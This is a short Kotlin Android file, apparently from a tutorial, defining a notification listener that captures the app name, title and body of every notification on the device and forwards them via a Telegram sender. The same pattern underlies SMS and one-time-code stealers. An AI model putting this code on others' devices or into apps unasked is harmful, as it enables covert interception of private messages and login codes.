package com.kztutorial.sms

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text

        val content = buildString {
            appendLine("📱 $packageName")
            appendLine("Title: $title")
            appendLine("Body: $bigText")
        }

        Log.d("NotificationService", content)
        TelegramSender.send(this, content)
    }
}
